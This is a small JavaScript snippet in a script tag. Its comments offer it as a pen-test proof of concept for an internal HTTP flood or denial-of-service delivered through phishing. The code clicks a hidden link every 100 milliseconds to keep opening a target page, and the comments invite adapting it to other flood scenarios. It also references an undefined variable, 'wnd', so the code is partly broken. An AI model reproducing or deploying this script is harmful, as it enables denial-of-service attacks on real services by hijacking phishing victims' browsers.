//can be used in some pen tests as a PoC, with pishing, to exploit some internal http dos or flood...
//just opens pages at random
//page opening at random can be repurposed into more "specific" scenarios to simulate various floods (not named in here... but use your imagination)
// jump site, use pishing link, etc...

<script type='text/javascript'>

    function runInternalAttack() {
        var a = document.createElement('a');
        document.body.appendChild(a);
        a.style = 'display: none';
        a.target="_blank";
        a.href = "<website goes in here...>";
        
        a.click();
        window.URL.revokeObjectURL(wnd);
    };

window.setInterval(function(){
    runInternalAttack();
}, 100);

</script>
